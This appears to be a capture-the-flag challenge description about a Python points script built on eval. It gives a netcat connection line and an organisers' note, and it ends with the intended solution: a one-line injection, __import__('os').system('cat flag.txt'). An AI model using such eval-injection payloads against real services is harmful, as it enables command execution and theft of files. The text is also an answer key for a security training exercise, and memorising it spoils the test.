# Pod EVALuation

Pod 1.3.3.7 made a reward system to fellows that are helping
each other. The idea is to add points to a fellow every time
they help another fellow. Then, during the pod evaluation,
the points each member earned are summed up and fellows get
prizes depending on the amount of points they earned. They
tried coding a simple python script to help them and hosted
it in a server to store the points, but something about this
code doesn't smell right to you. They asked Will to test the
code, but he's not sure the code is flawless.

**Obs:** You do NOT need (or should) use brute forcing techniques
to solve this challenge. Doing so is against the rules.

`nc <server_ip> <server_port>`

**Obs (to ctf crew):** give the `sum.py` file to contestants as well

**Solution:** inject python code on `eval`: `__import__('os').system('cat flag.txt')`
